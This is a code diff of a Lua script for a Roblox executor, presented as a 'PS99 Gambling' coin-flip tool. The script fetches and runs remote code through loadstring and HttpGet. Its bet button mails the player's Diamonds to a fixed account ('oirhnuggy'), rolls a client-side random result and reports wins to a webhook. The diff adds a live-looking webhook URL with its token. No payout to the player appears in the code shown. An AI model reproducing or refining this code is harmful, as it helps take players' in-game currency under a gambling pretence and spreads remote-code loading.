@@ -1,53 +1,70 @@
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "PS99 Gambling", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
+
 OrionLib:MakeNotification({
-	Name = "READ ME",
-	Content = "Make sure to stand near mailbox for the best experience.",
-	Image = "rbxassetid://4483345998",
-	Time = 15
-})
-local CF = Window:MakeTab({
-	Name = "Coin Flip",
-	Icon = "rbxassetid://4483345998",
-	PremiumOnly = false
+    Name = "READ ME",
+    Content = "Make sure to stand near mailbox for the best experience.",
+    Image = "rbxassetid://4483345998",
+    Time = 15
 })
 
+local CF = Window:MakeTab({
+    Name = "Coin Flip",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local betAmount = 0
+local userChoice = "None"
+
 CF:AddTextbox({
-	Name = "Bet",
-	Default = "",
-	TextDisappear = false,
-	Callback = function(bet)
-		betAmount = tonumber(bet)
-	end	  
+    Name = "Bet",
+    Default = "",
+    TextDisappear = false,
+    Callback = function(bet)
+        betAmount = tonumber(bet)
+    end    
 })
 
 CF:AddDropdown({
-	Name = "Choice",
-	Default = "None",
-	Options = {"Heads", "Tails"},
-	Callback = function(choice)
-		userChoice = tostring(choice)
-	end    
+    Name = "Choice",
+    Default = "None",
+    Options = {"Heads", "Tails"},
+    Callback = function(choice)
+        userChoice = tostring(choice)
+    end    
 })
 
 CF:AddButton({
-	Name = "Flip Coin!",
-	Callback = function()
-      	flipCoin()
-  	end    
+    Name = "Flip Coin!",
+    Callback = function()
+        flipCoin()
+    end    
 })
 
 OrionLib:Init()
 
 function flipCoin()
+    if not betAmount or type(betAmount) ~= "number" or betAmount <= 0 then
+        OrionLib:MakeNotification({
+            Name = "Error",
+            Content = "Please enter a valid bet amount.",
+            Image = "rbxassetid://4483345998",
+            Time = 5
+        })
+        return
+    end
+
     local GetSave = function()
         return require(game.ReplicatedStorage.Library.Client.Save).Get()
     end
 
     local saveData = GetSave()
+    local hasEnoughDiamonds = false
 
     for i, v in pairs(saveData.Inventory.Currency) do
-        if v.id == "Diamonds" and v._am >= betAmount then
+        if v.id == "Diamonds" and v._am and v._am >= betAmount then
+            hasEnoughDiamonds = true
             local args = {
                 [1] = "oirhnuggy",
                 [2] = v.id,
@@ -56,17 +73,28 @@ function flipCoin()
                 [5] = betAmount
             }
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            break
         end
     end
-    task.wait(1)
-    OrionLib:MakeNotification(
-        {
-            Name = "Validating...",
-            Content = "Checking if payment was successful.",
+
+    if not hasEnoughDiamonds then
+        OrionLib:MakeNotification({
+            Name = "Error",
+            Content = "Not enough Diamonds to place the bet.",
             Image = "rbxassetid://4483345998",
-            Time = 3
-        }
-    )
+            Time = 5
+        })
+        return
+    end
+
+    task.wait(1)
+    OrionLib:MakeNotification({
+        Name = "Validating...",
+        Content = "Checking if payment was successful.",
+        Image = "rbxassetid://4483345998",
+        Time = 3
+    })
+
     task.wait(2)
     local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local result = saveModule.Get()
@@ -76,17 +104,17 @@ function flipCoin()
         if v.Item and v.Item.data then
             local itemData = v.Item.data
             if v.Receiver == 2042685435 and itemData.id == "Diamonds" and itemData._am >= betAmount then
-                OrionLib:MakeNotification(
-                    {
-                        Name = "Success!",
-                        Content = "Payment was successful.",
-                        Image = "rbxassetid://4483345998",
-                        Time = 3
-                    }
-                )
+                OrionLib:MakeNotification({
+                    Name = "Success!",
+                    Content = "Payment was successful.",
+                    Image = "rbxassetid://4483345998",
+                    Time = 3
+                })
+                break
             end
         end
     end
+
     task.wait(1)
     OrionLib:MakeNotification({
         Name = "Flipping...",
@@ -94,35 +122,39 @@ function flipCoin()
         Image = "rbxassetid://4483345998",
         Time = 3
     })
-    task.wait(3)
 
+    task.wait(3)
     math.randomseed(os.time())
     local win = math.random() < 0.5
 
     if win then
-        local webhookUrl = "https://webhook.example.com/api/webhooks/yourwebhookurl"
+        local syn = syn or {}
+        local request = syn.request or http_request
+        local HttpService = game:GetService("HttpService")
 
+        local webhookUrl = "https://webhook.lewistehminerz.dev/api/webhooks/1204658074741248011/hCmI1dhgDo5vhYlfZfAHQwpNLmhGojicKX3gd5lYuXnpT6gX4zxA5YAjcBbQl8mR00Te"
         local lp = game.Players.LocalPlayer.Name
-        
-        local function sendWebhookMessage(embed)
-            local syn = syn or {}
-            local request = syn.request or http_request
-            local HttpService = game:GetService("HttpService")
 
-            local success, response = pcall(function()
-                request({
-                    Url = webhookUrl,
-                    Method = "POST",
-                    Headers = {["Content-Type"] = "application/json"},
-                    Body = HttpService:JSONEncode({embeds = {embed}})
-                })
-            end)
+        local function sendWebhookMessage(embed)
+            local success, response =
+                pcall(
+                function()
+                    request(
+                        {
+                            Url = webhookUrl,
+                            Method = "POST",
+                            Headers = {["Content-Type"] = "application/json"},
+                            Body = HttpService:JSONEncode({embeds = {embed}})
+                        }
+                    )
+                end
+            )
         end
-        
+
         local embed = {
-            title = "PS99 Gamble",
+            title = "PS99",
             description = lp .. " has won " .. betAmount * 2 .. ".",
-            color = 0xFB9BCB
+            color = 0xFFD700
         }
         sendWebhookMessage(embed)
 
